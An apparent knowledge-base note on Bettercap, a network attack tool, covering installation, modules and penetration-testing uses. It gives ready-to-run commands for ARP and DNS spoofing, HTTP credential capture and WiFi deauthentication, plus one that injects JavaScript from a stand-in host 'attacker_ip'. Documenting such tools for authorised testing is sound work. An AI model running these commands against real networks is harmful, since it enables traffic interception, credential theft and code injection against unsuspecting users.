## Overview
Bettercap is a powerful, flexible, and fast network attack and monitoring tool designed to perform various types of network and protocol attacks, as well as to manipulate HTTP, HTTPS, and TCP traffic in real-time. It is a Swiss Army knife for network attacks and is frequently used by penetration testers, red teams, and security researchers to assess network security. Bettercap is capable of performing a wide range of tasks, such as ARP spoofing, DNS spoofing, packet sniffing, man-in-the-middle (MitM) attacks, and more.

## Features
- **Network Sniffing and Monitoring:** Captures and analyzes network traffic in real-time, providing detailed information about the devices and traffic on the network.
- **ARP Spoofing:** Performs ARP spoofing to intercept network traffic and redirect it through the attacker's machine for further analysis.
- **DNS Spoofing:** Manipulates DNS responses to redirect traffic to malicious servers or fake websites.
- **HTTP and HTTPS Proxy:** Intercepts and manipulates HTTP and HTTPS traffic to inject malicious payloads or perform credential capture.
- **Modular Design:** Includes various modules for specific tasks, such as wifi, ble, sniffer, proxy, and more.
- **Cross-Platform:** Available on Linux, macOS, and Windows.

## Website
- [Bettercap Official Website](https://www.bettercap.org/)

## Installation

### On Unix-based systems (Linux/macOS):
1. **Install Bettercap via Package Manager:**
   - On Debian-based systems:
```sh
sudo apt-get install bettercap
```
   - On macOS using Homebrew:
```sh
brew install bettercap
```

2. **Build from Source:**
   - Clone the repository from GitHub:
```sh
git clone https://github.com/bettercap/bettercap.git
cd bettercap
make build
sudo make install
```

### On Windows:
1. **Download the Binary:**
   - Download the latest Windows binaries from the [Bettercap Releases Page](https://github.com/bettercap/bettercap/releases).

2. **Extract and Run:**
   - Extract the downloaded files and run `bettercap.exe` from the command prompt.

## Basic Usage
Bettercap is run from the command line interface (CLI). Here are some common commands and usage examples:

### Start Bettercap
To start Bettercap with a specific network interface:
```sh
sudo bettercap -iface eth0
```
- **`-iface eth0`**: Specifies the network interface to use (e.g., `eth0`).

### Network Sniffing and Monitoring
To sniff and monitor network traffic:
```sh
sudo bettercap -iface eth0 -eval "net.sniff on"
```
- **`-eval`**: Runs the specified commands on startup.

### ARP Spoofing
To perform ARP spoofing on the network:
```sh
sudo bettercap -iface eth0 -eval "arp.spoof on"
```

### DNS Spoofing
To perform DNS spoofing to redirect traffic:
```sh
sudo bettercap -iface eth0 -eval "net.recon on; dns.spoof on"
```
- **`net.recon on`**: Enables network reconnaissance to discover hosts.

### Capturing Credentials
To intercept and capture HTTP credentials:
```sh
sudo bettercap -iface eth0 -eval "http.proxy on; http.proxy.capture on"
```

### Injecting Code into HTTP Responses
To inject code into HTTP responses for all web traffic:
```sh
sudo bettercap -iface eth0 -eval "http.proxy on; http.proxy.injectjs http://attacker_ip/payload.js"
```

## Key Features and Modules

### ARP Spoofing
- **Description:** Intercepts and manipulates ARP traffic to redirect network traffic through the attacker's machine, enabling man-in-the-middle (MitM) attacks.
- **Usage:**
```sh
sudo bettercap -iface eth0 -eval "arp.spoof on"
```

### DNS Spoofing
- **Description:** Manipulates DNS responses to redirect traffic intended for specific domains to attacker-controlled IP addresses.
- **Usage:**
```sh
sudo bettercap -iface eth0 -eval "dns.spoof on"
```

### HTTP/HTTPS Proxy
- **Description:** Intercepts and manipulates HTTP and HTTPS traffic, allowing for credential capture, payload injection, and more.
- **Usage:**
```sh
sudo bettercap -iface eth0 -eval "http.proxy on"
```

### WiFi and BLE Attacks
- **Description:** Performs attacks on WiFi and Bluetooth Low Energy (BLE) devices, such as deauthentication and packet injection.
- **Usage:**
```sh
sudo bettercap -iface wlan0 -eval "wifi.recon on; wifi.deauth on"
```

### Sniffer Module
- **Description:** Captures network packets and analyzes them in real-time to identify sensitive data, such as passwords and session cookies.
- **Usage:**
```sh
sudo bettercap -iface eth0 -eval "net.sniff on"
```

## Tools for Network Security and Penetration Testing Using Bettercap

- **Network Sniffing and Analysis:** Use Bettercap to capture and analyze network traffic, identifying sensitive data and potential vulnerabilities.
- **Man-in-the-Middle Attacks:** Perform ARP spoofing, DNS spoofing, and proxy attacks to intercept and manipulate network traffic for credential capture or data exfiltration.
- **Wireless Network Attacks:** Conduct attacks on WiFi and BLE devices to test network security and identify weaknesses.
- **Credential Harvesting:** Capture HTTP, HTTPS, and proxy credentials from network traffic during penetration tests.
- **Phishing and Social Engineering:** Use DNS spoofing and HTTP injection to redirect users to fake login pages for credential capture.

## Best Practices
- **Use Bettercap Responsibly:** Always ensure that you have permission before using Bettercap for network sniffing, spoofing, or attacks, as it can disrupt legitimate network traffic.
- **Limit Exposure:** Use specific modules and target IP ranges to limit the scope of attacks and avoid unnecessary network disruption.
- **Monitor Network Traffic:** Regularly monitor network traffic for signs of unauthorized use of Bettercap or similar tools to detect potential intrusions.
- **Combine with Other Tools:** Use Bettercap alongside other network tools like [[Ettercap]], [[Wireshark]], and [[Responder]] for comprehensive network assessments.
- **Keep Bettercap Updated:** Regularly update Bettercap to benefit from the latest features, security enhancements, and bug fixes.

## References
- [Bettercap Official Website](https://www.bettercap.org/)
- [Bettercap GitHub Repository](https://github.com/bettercap/bettercap)
- [Bettercap Documentation and Usage](https://bettercap.org/docs/)
- [Advanced Network Attacks with Bettercap](https://null-byte.wonderhowto.com/how-to/advanced-mitm-attacks-using-bettercap-0193780/)

